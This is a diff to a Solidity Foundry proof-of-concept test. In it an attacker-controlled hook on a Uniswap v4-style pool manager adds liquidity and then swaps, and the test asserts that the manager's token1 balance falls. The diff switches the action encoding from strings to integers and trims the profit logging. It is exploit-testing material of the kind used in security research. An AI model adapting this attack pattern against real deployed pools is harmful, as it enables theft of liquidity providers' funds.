@@ -40,16 +40,14 @@ contract POC is Test {
         hook.setCurrency1(Currency.wrap(address(token1)));
         hook.setAttacker(address(this));
         manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
-        // add liquidity using "ADD" call
-        manager.unlock(abi.encode("ADD"));
+        manager.unlock(abi.encode(uint256(1))); // 1 = ADD
     }
 
     function unlockCallback(bytes calldata data) external returns(bytes memory){
         Currency c0 = Currency.wrap(address(token0));
         Currency c1 = Currency.wrap(address(token1));
-        string memory action = data.length>0 ? abi.decode(data,(string)) : "SWAP";
-        
-        if(keccak256(bytes(action))==keccak256(bytes("ADD"))){
+        uint256 action = abi.decode(data,(uint256));
+        if(action==1){
             (BalanceDelta delta,) = manager.modifyLiquidity(key, ModifyLiquidityParams(-60,60,10e18,0), "");
             int128 amt0 = delta.amount0();
             int128 amt1 = delta.amount1();
@@ -60,7 +58,7 @@ contract POC is Test {
             if (amt0 > 0) manager.take(c0, address(this), uint128(amt0));
             if (amt1 > 0) manager.take(c1, address(this), uint128(amt1));
         } else {
-            console.log("DOING SWAP");
+            console.log("DOING SWAP NOW");
             BalanceDelta sDelta = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
             int128 s0 = sDelta.amount0();
             int128 s1 = sDelta.amount1();
@@ -76,12 +74,9 @@ contract POC is Test {
 
     function test_afterSwapReturnDelta() public {
         uint bBefore=token1.balanceOf(address(manager));
-        uint myBefore=token1.balanceOf(address(this));
-        manager.unlock(abi.encode("SWAP"));
+        manager.unlock(abi.encode(uint256(2))); // 2 = SWAP
         uint bAfter=token1.balanceOf(address(manager));
-        uint myAfter=token1.balanceOf(address(this));
-        console.log("Manager Loss", bBefore - bAfter);
-        console.log("My Profit", myAfter - myBefore);
+        console.log("Loss", bBefore - bAfter);
         assertLt(bAfter, bBefore);
     }
 }
